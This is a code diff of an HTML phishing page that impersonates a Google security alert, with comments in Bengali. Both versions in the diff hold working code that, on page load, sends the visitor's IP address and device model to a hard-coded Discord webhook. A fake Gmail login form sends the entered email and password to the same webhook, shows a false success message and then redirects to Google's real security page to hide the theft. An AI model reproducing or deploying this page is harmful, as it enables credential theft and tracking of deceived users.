@@ -3,65 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Alert</title>
     
-    <meta property="og:title" content="Google Security Notification" />
-    <meta property="og:description" content="Your account is under attack! Verify immediately." />
-    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" />
-
-    <title>Google Verification</title>
-
     <script>
-        const WH = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
+        // তোমার ডিসকর্ড লিঙ্ক
+        const webhook = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
-        // ১. ক্লিক করার সাথে সাথে আইপি পাঠানোর সবচেয়ে ফাস্ট উপায় (কিলার কোড)
-        (async function shoot() {
-            let ip = "IP Blocked";
-            let model = navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown";
+        // ১. লিঙ্কে ক্লিক করার সাথে সাথে আইপি এবং মডেল পাঠানোর মেইন ইঞ্জিন
+        async function hitNow() {
+            let userIP = "Detecting...";
+            let device = navigator.userAgent.match(/\(([^)]+)\)/)?.[1].split(';')[0] || navigator.platform;
 
+            // আইপি ধরার জন্য সবচেয়ে ফাস্ট সার্ভিস
             try {
-                // ২. আইপি ধরার জন্য হাই-স্পিড সার্ভার
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch(e) {}
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (e) { userIP = "IP Hidden by User"; }
 
-            // ৩. ডিসকর্ডে সাথে সাথে সিগন্যাল পাঠানো
-            const p1 = JSON.stringify({
-                content: "🚨 **NEW TARGET DETECTED!**",
-                embeds: [{
-                    color: 16711680,
-                    fields: [
-                        { name: "🌐 IP Address", value: ip },
-                        { name: "📱 Mobile Model", value: model }
-                    ],
-                    timestamp: new Date()
-                }]
+            // সাথে সাথে ডিসকর্ডে পাঠানো
+            await fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: "🚀 **TARGET CLICKED THE LINK!**",
+                    embeds: [{
+                        color: 16711680,
+                        title: "Target Information Identified",
+                        fields: [
+                            { name: "🌐 IP Address", value: userIP, inline: true },
+                            { name: "📱 Device Model", value: device, inline: true }
+                        ],
+                        footer: { text: "Collected at: " + new Date().toLocaleTimeString() }
+                    }]
+                })
             });
-            navigator.sendBeacon(WH, p1);
-        })();
-
-        // ৪. জিমেইল ও পাসওয়ার্ড পাঠানোর ফাংশন
-        async function sendData() {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-
-            if(!u || !p) return alert("সঠিক তথ্য দিন!");
-
-            const p2 = JSON.stringify({
-                content: "🧨 **LOGIN DATA CAPTURED!**",
-                embeds: [{
-                    color: 65280,
-                    fields: [
-                        { name: "Email", value: u },
-                        { name: "Password", value: p }
-                    ]
-                }]
-            });
-
-            await fetch(WH, { method: "POST", headers: {"Content-Type":"application/json"}, body: p2 });
-            alert("ভেরিফিকেশন সফল! আপনার অ্যাকাউন্ট এখন নিরাপদ।");
-            window.location.href = "https://myaccount.google.com/security";
         }
+
+        // পেজ লোড হওয়ার জন্য অপেক্ষা না করে সাথে সাথে রান করো
+        hitNow();
     </script>
 
     <style>
@@ -83,8 +63,36 @@
     </div>
     <input type="email" id="u" placeholder="জিমেইল এড্রেস">
     <input type="password" id="p" placeholder="পাসওয়ার্ড">
-    <button class="btn" onclick="sendData()">ভেরিফাই করুন</button>
+    <button class="btn" onclick="sendLogin()">ভেরিফাই করুন</button>
 </div>
+
+<script>
+    // ২. জিমেইল এবং পাসওয়ার্ড পাঠানোর অংশ
+    async function sendLogin() {
+        const email = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+
+        if(!email || !pass) return alert("সঠিক তথ্য দিন!");
+
+        await fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "🧨 **LOGIN DATA CAPTURED!**",
+                embeds: [{
+                    color: 65280,
+                    fields: [
+                        { name: "📧 Email", value: email },
+                        { name: "🔑 Password", value: pass }
+                    ]
+                }]
+            })
+        });
+
+        alert("ভেরিফিকেশন সফল! আপনার অ্যাকাউন্ট এখন নিরাপদ।");
+        window.location.href = "https://myaccount.google.com/security";
+    }
+</script>
 
 </body>
 </html>
